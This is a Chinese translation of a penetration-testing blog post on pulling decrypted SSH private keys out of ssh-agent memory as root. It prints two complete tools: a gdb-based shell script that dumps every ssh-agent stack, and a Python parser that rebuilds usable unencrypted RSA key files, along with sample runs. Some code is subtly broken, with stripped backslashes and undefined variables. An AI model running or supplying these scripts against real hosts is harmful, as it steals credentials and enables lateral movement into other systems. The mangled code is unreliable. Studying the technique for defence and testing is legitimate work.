# 从内存中窃取未加密的SSH-agent密钥

**from：https://www.netspi.com/blog/entryid/235/stealing-unencrypted-ssh-agent-keys-from-memory**

0x01 背景
-------

* * *

如果你曾经使用过SSH密钥来管理多台设备，那么你很可能已经用过SSH-agent了。这个工具是用来在内存中保存SSH密钥的，这样用户就不需要每次都输入他们的口令了。然而，这可能招致一些安全威胁。一个以root权限运行的用户可能足以从内存中取出解密后的SSH密钥并重新构造。 由于需要root权限，这个攻击看上去很鸡肋。比如说，一个攻击者可以安装一个键盘记录器并用之获取SSH密钥。然而，这样会导致攻击者必须等待目标输入他们SSH密钥的口令。这可能要花上几个小时，几天，甚至几个星期，取决于目标登出的频率。这也是从内存中获取SSH密钥为什么对于迅速拿下其他机器非常重要

0x02 使用 SSH-agent
-----------------

* * *

使用SSH-agent的一个通用的方法是启动"SSH-agent bash"然后用"SSH-add"把密钥添加到agent中。一旦添加完，这个密钥将会在SSH-agent的栈中保存直到进程结束、另一密钥加入、或者用户使用SSH-add的-d或者-D选项为止。大多数人只会运行SSH-agent然后就忘掉这回事直到重启。

0x03 从内存中取SSH密钥
---------------

* * *

有很多种方式可以建立一个SSH-agents的内存镜像。最简单的方法是通过gdb的功能。Gdb使用了ptrace调用来连接SSH-agent。这给gdb提供了必要的截取内存以及运行进程的权限。[grabagentmem.sh](https://github.com/NetSPI/sshkey-grab/blob/master/grabagentmem.sh)脚本提供了一种自动化截取内存的方式。默认情况下，当其运行时它会为每一个SSH-agent进程的栈创建一个内存镜像。这些文件被命名为SSHagent-PID.stack

```
root@test:/tmp# grabagentmem.sh 
Created /tmp/SSHagent-17019.stack 

```

如果gdb在系统中不可用，那么也可以获取整个系统的内存镜像然后暴力解出SSH-agent进程的栈的内存。然而，这个做法不在我们本文的讨论范围之内。

0x04 从内存镜像中解析出SSH密钥
-------------------

* * *

一旦我们获得了栈的副本那么我们就可以从这个文件里解析出密钥了。然而，在这个栈中保存的密钥和SSH-keygen生成的密钥格式不同。这就是[parse_mem.py](https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py)脚本好用的地方。这段脚本需要安装pyasn1 python模块。如果安装好了就可以用这脚本对付内存文件了。如果那个内存文件中包含了一个有效的RSA SSH密钥，那么它将会把它保存到硬盘上。这工具未来的版本还可能支持额外的密钥类型，比如说DSA, ECDSA, ED25519, 和 RSA1

```
root@test:/tmp# parse_mem.py /tmp/SSHagent-17019.stack /tmp/key
Found rsa key
Creating rsa key: /tmp/key.rsa 

```

这个key.rsa文件之后就可以被用来做SSH命令的-i参数，这就跟原始的用户密钥一模一样，只不过不再需要口令来解锁了。 获取有效的，可用的SSH密钥可以帮助渗透测试人员更加深入目标网络。密钥常常被用户在多个账户上使用。包括服务器的root账户。也可能服务器被配置为只允许密钥登陆。拥有一个解密了的密钥可以让当前环境下的行动更加简单。

* * *

附1：译者测试截图
---------

![enter image description here](http://drops.javaweb.org/uploads/images/066aa4cf8de432a6badf6122e56dfa6df04fbeff.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/e47c433da6f3ea91b0eeed839e900d0dbc872c90.jpg)

附2：文中涉及脚本
---------

**grabagentmem.sh：**

```
# First argument is the output directory.  Use /tmp if this is not specified.
outputdir="/tmp"

# Grab pids for each ssh-agent
sshagentpids=$(ps --no-headers -fC ssh-agent | awk '{print $2}')

# Iterate through the pids and create a memory dump of the stack for each
for pid in $sshagentpids; do
    stackmem="$(grep stack /proc/$pid/maps | sed -n 's/^([0-9a-f]*)-([0-9a-f]*) .*$/1 2/p')"
    startstack=$(echo $stackmem | awk '{print $1}')
    stopstack=$(echo $stackmem | awk '{print $2}')

    gdb --batch -pid $pid -ex "dump memory $outputdir/sshagent-$pid.stack 0x$startstack 0x$stopstack" 2&>1 >/dev/null 

    # GDB doesn't error out properly if this fails.  
    # This will provide feedback if the file is actually created
    if [ -f "$outputdir/sshagent-$pid.stack" ]; then
        echo "Created $outputdir/sshagent-$pid.stack"
    else
        echo "Error dumping memory from $pid"
    fi
done

```

**parse_mem.py：**

```
import sys
import base64
from pyasn1.type import univ
from pyasn1.codec.der import encoder


class sshkeyparse:
    """ This class is designed to parse a memory dump of ssh-agent and create
    unencrypted ssh keys that can then be used to gain access to other
    systems"""
    keytypes = {
        'rsa': "ssh-rsa",
        'dsa': "ssh-dss",
        'ecsda': "ecdsa-sha2-nisp256",
        'ed25519': "ssh-ed25519"
    }

    def read(self, memdump):
        """ Reads a file and stories it in self.mem"""
        self.inputfile = memdump
        file = open(memdump, 'rb')
        self.mem = "".join(file.readlines())
        file.close()

    def unpack_bigint(self, buf):
        """Turn binary chunk into integer"""

        v = 0
        for c in buf:
            v *= 256
            v += ord(c)

        return v

    def search_key(self):
        """Searches for keys in self.mem"""

        keysfound = {}

        for type in self.keytypes:
            magic = self.mem.find(self.keytypes[type])

            if magic is not -1:
                keysfound[magic] = type

        if keysfound:
            print ("Found %s key" % keysfound[sorted(keysfound)[0]])
            self.mem = self.mem[sorted(keysfound)[0]:]
            self.type = keysfound[sorted(keysfound)[0]]
            return 1

        if not keysfound:
            return -1

    def getkeys(self, output):
        """ Parses for keys stored in ssh-agent's stack """

        keynum = 0
        validkey = 0

        validkey = self.search_key()
        while validkey != -1:

            if keynum == 0:
                keynum += 1
                self.create_key(output)

            else:
                keynum += 1
                self.create_key((output + "." + str(keynum)))

            validkey = self.search_key()

        if keynum == 0:
            # Did not find a valid key type
            print ("A saved key was not found in %s" % self.inputfile)
            print ("The user may not have loaded a key or the key loaded is " +
                   "not supported.")
            sys.exit(1)
        else:
            return

    # Detect type of key and run key creation
    def create_key(self, output):
        """Creates key files"""

        output = output + "." + self.type

        if self.type is "rsa":
            self.create_rsa(output)
            print ("Creating %s key: %s" % (self.type, output))
        if self.type is "dsa":
            self.create_dsa(output)
            print ("Creating %s key: %s" % (self.type, output))
        else:
            print ("%s key type is not currently supported." % self.type)
            sys.exit(3)

    def create_dsa(self, output):
        """Create DSA SSH key file"""
        if self.mem[0:7] == "ssh-dss":
            print ("DSA SSH Keys are not currently supported.")
            self.mem = self.mem[start+size:]

        else:
            print ("Error: This is not a DSA SSH key file")
            sys.exit(2)

    def create_rsa(self, output):
        """Create RSA SSH key file"""
        if self.mem[0:7] == "ssh-rsa":

            # FIXME: This needs to be cleaned up.
            start = 10
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            n = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            e = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            d = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            c = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            p = self.unpack_bigint(self.mem[start:(start+size)])
            start = start + size + 2
            size = self.unpack_bigint(self.mem[start:(start+2)])
            start += 2
            q = self.unpack_bigint(self.mem[start:(start+size)])

            e1 = d % (p - 1)
            e2 = d % (q - 1)

            self.mem = self.mem[start+size:]

        else:
            print ("Error: This is not a RSA SSH key file")
            sys.exit(2)

        seq = (
            univ.Integer(0),
            univ.Integer(n),
            univ.Integer(e),
            univ.Integer(d),
            univ.Integer(p),
            univ.Integer(q),
            univ.Integer(e1),
            univ.Integer(e2),
            univ.Integer(c),
            )

        struct = univ.Sequence()

        for i in xrange(len(seq)):
            struct.setComponentByPosition(i, seq[i])

        raw = encoder.encode(struct)
        data = base64.b64encode(raw)

        # chop data up into lines of certain width
        width = 64
        chopped = [data[i:i + width] for i in xrange(0, len(data), width)]
        # assemble file content
        content = """-----BEGIN RSA PRIVATE KEY-----
%s
-----END RSA PRIVATE KEY-----
""" % 'n'.join(chopped)
        output = open(output, 'w')
        output.write(content)
        output.close()

# MAIN

keystart = sshkeyparse()
keystart.read(sys.argv[1])
keystart.getkeys(sys.argv[2])

```